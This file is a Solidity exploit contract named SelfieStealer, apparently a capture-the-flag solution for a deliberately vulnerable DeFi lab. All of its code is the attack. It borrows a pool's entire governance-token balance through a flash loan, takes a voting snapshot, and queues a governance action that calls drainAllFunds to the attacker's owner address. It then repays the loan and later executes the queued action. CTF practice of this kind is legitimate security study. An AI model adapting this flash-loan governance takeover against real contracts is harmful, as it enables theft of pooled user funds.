pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISimpleGovernance {
  function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
  function executeAction(uint256 actionId) external payable;
}

contract SelfieStealer {
  using Address for address;

  address immutable selfie;
  ISimpleGovernance immutable governance;
  IERC20 immutable govToken;
  address owner;
  uint256 id;

  constructor(address _selfie, ISimpleGovernance _governance, IERC20 _govToken, address _owner) {
    selfie = _selfie;
    governance = _governance;
    govToken = _govToken;
    owner = _owner;
  }

  function attack() external {
    uint bal = govToken.balanceOf(selfie);
    selfie.functionCall(
      abi.encodeWithSignature(
        "flashLoan(uint256)",
        bal
      )
    );
  }

  function attack2() external {
    governance.executeAction(id);
  }

  function receiveTokens(address, uint256 amount) external {
    address(govToken).functionCall(
      abi.encodeWithSignature("snapshot()")
    );
    bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", owner);
    id = governance.queueAction(selfie, data, 0);
    govToken.transfer(selfie, amount);
  }
}